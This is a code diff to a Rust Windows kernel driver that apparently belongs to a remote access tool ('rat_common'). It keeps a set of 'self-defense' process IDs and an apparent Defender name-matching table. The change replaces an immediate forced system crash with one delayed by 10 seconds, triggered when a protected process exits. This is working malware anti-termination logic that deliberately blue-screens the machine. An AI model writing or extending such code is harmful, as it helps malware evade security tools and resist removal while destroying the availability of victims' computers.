@@ -1,10 +1,14 @@
-use core::mem;
+use core::ffi::c_void;
 use core::sync::atomic::Ordering;
+use core::{mem, ptr};
 
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::nt_success;
-use wdk_sys::ntddk::{KeBugCheckEx, PsSetCreateProcessNotifyRoutineEx};
-use wdk_sys::{HANDLE, PEPROCESS, PPS_CREATE_NOTIFY_INFO, STATUS_ACCESS_DENIED};
+use wdk_sys::_MODE::KernelMode;
+use wdk_sys::ntddk::{
+    KeBugCheckEx, KeDelayExecutionThread, PsCreateSystemThread, PsSetCreateProcessNotifyRoutineEx,
+};
+use wdk_sys::{HANDLE, LARGE_INTEGER, PEPROCESS, PPS_CREATE_NOTIFY_INFO, STATUS_ACCESS_DENIED};
 
 use crate::global::{MS_DEFENDER_AHO_CORASICK, SELF_DEFENSE_PIDS};
 use crate::info;
@@ -31,6 +35,19 @@ pub fn ps_set_create_process_notify_routine_ex(extra: &KernelHandoff) -> anyhow:
     Ok(extra.process_notify_trampoline)
 }
 
+unsafe extern "C" fn _bugcheck_on_exit(_: *mut c_void) {
+    let mut sleep = LARGE_INTEGER {
+        QuadPart: -100000000, // 10s
+    };
+    unsafe {
+        let _ = KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep);
+        KeBugCheckEx(
+            0xEF, // CRITICAL_PROCESS_DIED
+            0, 0, 0, 0,
+        )
+    }
+}
+
 #[unsafe(export_name = "ProcessNotifyRoutine")]
 unsafe extern "C" fn process_notify_routine(
     process: PEPROCESS,
@@ -48,14 +65,17 @@ unsafe extern "C" fn process_notify_routine(
         if let Some(lock) = unsafe { SELF_DEFENSE_PIDS.load(Ordering::Acquire).as_ref() } {
             let set = lock.lock();
             if set.contains(&pid) {
+                let mut thread = HANDLE::default();
                 unsafe {
-                    KeBugCheckEx(
-                        0xEF, // CRITICAL_PROCESS_DIED
-                        process as u64,
+                    let _ = PsCreateSystemThread(
+                        &mut thread,
                         0,
-                        0,
-                        0,
-                    )
+                        ptr::null_mut(),
+                        ptr::null_mut(),
+                        ptr::null_mut(),
+                        Some(_bugcheck_on_exit),
+                        ptr::null_mut(),
+                    );
                 }
             }
         }
